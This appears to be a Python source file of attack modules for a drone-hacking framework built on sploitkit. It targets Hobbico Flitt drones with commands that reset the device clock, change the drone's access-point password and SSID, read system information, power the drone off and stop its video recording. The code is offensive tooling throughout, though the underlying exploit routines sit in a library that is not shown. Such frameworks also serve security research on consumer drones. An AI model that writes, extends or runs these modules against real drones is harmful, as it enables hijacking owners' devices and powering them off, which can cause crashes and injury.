# -*- coding: UTF-8 -*-
from sploitkit import *

from lib.drones.hobbico import FlittModule


class ChangeDatetime(FlittModule):
    """ Change the datetime of the target Flitt. """
    config = Config({
        Option(
            'NEW_DATETIME',
            "new datetime to be configured",
            True,
            #FIXME: validate=lambda s: [...],
        ): "01/01/1970 00:00:00",
        Option(
            'DATETIME_FORMAT',
            "datetime format to be considered",
            True,
        ): "%d/%m/%Y %H:%M:%S",
    })
    
    def run(self):
        self._change_datetime(self.config.get("NEW_DATETIME"),
                              self.config.get("DATETIME_FORMAT"))


class ChangeApPassword(FlittModule):
    """ Change the password of the target Flitt's AP. """
    config = Config({
        Option(
            'NEW_PASSWORD',
            "Target's new password",
            True,
        ): "12345678",
    })
    
    def run(self):
        self._change_ap_creds(self.config.option("TARGET").value,
                              self.config.option("NEW_PASSWORD").value, False)


class ChangeApSsid(FlittModule):
    """ Change the SSID of the target Flitt's AP. """
    config = Config({
        Option(
            'NEW_SSID',
            "Target's new SSID",
            True,
        ): "FLITT-abcdef",
    })
    
    def run(self):
        self._change_ap_creds(self.config.option("NEW_SSID").value,
                              self.config.option("PASSWORD").value)


class GetSysInfo(FlittModule):
    """ Get system information from the target Flitt. """
    def run(self):
        print_formatted_text(self._get_sysinfo())


class PowerOff(FlittModule):
    """ Power off the target Flitt. """
    def run(self):
        self._power_off()


class StopVideo(FlittModule):
    """ Stop video recording of the target Flitt. """
    def run(self):
        self._stop_video()
